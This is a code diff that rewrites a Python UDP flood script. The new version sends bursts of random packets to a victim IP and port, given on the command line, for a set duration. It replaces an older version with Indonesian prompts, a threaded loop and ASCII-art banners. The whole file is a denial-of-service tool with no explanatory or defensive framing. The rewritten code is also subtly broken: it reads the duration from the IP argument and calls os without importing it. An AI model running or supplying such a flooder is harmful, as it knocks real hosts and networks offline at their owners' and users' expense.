@@ -1,54 +1,33 @@
-import sys, os, time, socket, random, threading
+import time, sys, socket, random
 
-##########################################
+victim = str(sys.argv[1])
+vport = int(sys.argv[2])
+duration = int(sys.argv[1])
 
-def running(s):
-	try:
-		for c in s + '\n':
-        	    sys.stdout.write(c)
-	            sys.stdout.flush()
-	            time.sleep(0.001)
-	except (KeyboardInterrupt,EOFError):
-		run('Error!!')
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    pack = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 0
 
-##########################################
-
-os.system('cls' if os.name == 'nt' else 'clear')
-print("""
-Ezz Down Dekj...
-""")
-ip = str(input("• Masukkan IP > "))
-port = int(input("• Masukkan PORT > "))
-time.sleep(1)
-running("[>>] Attacking Started.")
-time.sleep(1)
-running("...................")
-time.sleep(1)
-os.system('cls' if os.name == 'nt' else 'clear')
-
-class Bimzzx(threading.Thread):
-    def run(self):
-    	sent = 0
-        while True:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            pack = random._urandom(1024)
-            bytes = random._urandom(1490)
-            sock.sendto(pack, (ip,port))
-            sock.sendto(bytes, (ip,port))
-            sent = sent + 1
-            print("Sent %s packet, to ip %s and throught port:%s"%(sent, ip, port))
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        client.sendto(pack, (victim, vport))
+        sent = sent + 1
+        print("Sent {} packets, to ip {} and throught port {}".format(sent, victim, vport))
 
 if __name__ == '__main__':
     try:
-        for x in range(150):
-            extrash = Bimzzx()
-            extrash.start()
-            time.sleep(0.1)
+        flood(victim, vport, duration)
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
-        print ("╔════════════════════════════════════╗")
-        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
-        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
-        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
-        print ("╚════════════════════════════════════╝")
-        pass
+        print ("\033[95m╔════════════════════════════════════╗")
+        print ("\033[95m         ╔═╗╔╦╗╔═╗╔═\u001b[31m╗╔═╗╔═╗╔╦╗        ")
+        print ("\033[95m         ╚═╗ ║ ║ ║╠═╝╠\u001b[31m═╝║╣  ║║        ")
+        print ("\033[95m         ╚═╝ ╩ ╚═╝╩  ╩  \u001b[31m╚═╝═╩╝        ")
+        print ("\033[95m╚════════════════════════════════════╝")
